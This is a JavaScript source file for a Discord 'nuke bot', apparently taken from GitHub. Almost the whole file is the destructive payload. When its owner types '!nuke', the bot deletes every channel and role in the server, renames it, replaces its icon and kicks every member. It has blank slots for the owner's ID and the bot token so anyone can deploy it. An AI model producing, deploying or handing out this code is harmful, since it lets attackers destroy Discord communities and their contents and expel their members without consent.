const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
  client.user.setActivity("Discord Nuke bot by MasterLua#6666")
  console.log("Bot Make by MasterLua#6666 | masterlua.xyz")
});

//NUKE ALL CHANNELS AND KICK MEMBERS FROM DISCORD
	client.on("message", (message) => {
    if (message.content.startsWith("!" + "nuke")) {
        if(message.author.id !== "") return; // HERE YOUR DISCORD ID 
        message.guild.channels.cache.forEach(channel => {
            channel.delete()
            .catch(console.error);
        })
        message.guild.setName(config.servername);
        message.guild.setIcon(config.icon);
        message.guild.members.cache.forEach(member => {
            member.kick()
            .catch(console.error);
        })
        message.guild.roles.cache.forEach(roles => {
            roles.delete()
            .catch(console.error);
        })
        }
});

client.login('');  //HERE YOUR DISCORD BOT TOKEN
© 2021 GitHub, Inc.
